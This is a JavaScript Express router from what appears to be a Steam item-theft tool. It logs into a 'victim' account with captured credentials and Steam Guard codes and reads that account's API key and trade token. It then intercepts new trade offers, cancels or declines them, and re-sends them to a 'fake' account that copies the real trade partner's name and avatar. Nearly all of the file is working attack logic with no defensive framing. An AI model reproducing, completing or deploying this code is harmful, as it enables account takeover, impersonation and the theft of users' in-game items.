var express = require('express');
var router = express.Router();

const SteamAPI = require('../public/javascripts/steam-api');
const SteamConverter = require('../public/javascripts/steam-converter');

const VictimAccount = require('../public/javascripts/victim-account');
const { fake } = require('./fake');

var victim = new VictimAccount();

router.get("/", (req, res, next) => {
    res.json(victim.getInfo());
});

router.get("/getTradeToken", (req, res, next) => {
    victim.getTradeToken()
          .then(response => res.send(response))
          .catch(error => res.status(400).send(error));
});

router.get("/getApiKey", (req, res, next) => {
    victim.getApiKey()
          .then(response => res.send(response))
          .catch(error => res.status(400).send(error));
});

router.put("/refresh", (req, res, next) => {
    victim.refreshInfo()
        .then(response => res.send(response))
        .catch(error => res.status(400).send(error));
});

router.get("/isLoggedIn", (req, res, next) => {
    res.send(victim.isLoggedIn());
});

router.post("/login", (req, res, next) => {
    victim.login(req.body.login, req.body.password, req.body.guard)
          .then(response => res.send(response))
          .catch(error => res.status(400).send(error));
});

router.put("/updateName", (req, res, next) => {
    victim.updateName(req.body.name)
          .then(response => res.send(response))
          .catch(error => res.status(400).send(error));
});

router.post("/logout", (req, res, next) => {
    victim.logout()
          .then(response => {
              victim = new VictimAccount();
              res.send(response);
          })
          .catch(error => res.status(400).send(error));
});

router.post("/start", (req, res, next) => {
    res.send("Process started");

    victim.waitForNewOffer(fake ? fake.ID32 : "", 1000)
            .then(offer => {
                SteamAPI.getProfileInfo(victim.apiKey || fake ? fake.apiKey : "", SteamConverter.ID32toID64(offer.accountid_other))
                        .then(user => {
                            const name = user.personaname;
                            const avatarUrl = user.avatarfull;

                            fake.updateAvatar(avatarUrl).then(newUrl => console.log("(Fake) Avatar has been set ✓"));
                            fake.updateName(name).then(newName => console.log("(Fake) Name has been set ✓"));
                        })
                        .catch(error => res.status(400).send(error));

                if (offer.is_our_offer) {
                    victim.cancelOffer(offer.tradeofferid)
                            .then(() => {
                                victim.makeOffer(fake.ID32, fake.ID64, offer.items_to_receive, offer.items_to_give, offer.message)
                                    .then(() => {
                                        // TODO accept offer on Fake account
                                    })
                                    .catch(error => res.status(400).send(error));
                            })
                            .catch(error => res.status(400).send(error));
                }
                else {
                    victim.declineOffer(offer.tradeofferid)
                            .then(() => {
                                fake.makeOffer(victim.ID32, victim.ID64, offer.items_to_give, [], offer.message)
                                    .then(() => {
                                        // ?
                                    })
                                    .catch(error => res.status(400).send(error));
                            })
                            .catch(error => res.status(400).send(error));
                }
            }).catch();
});

module.exports = { router, victim };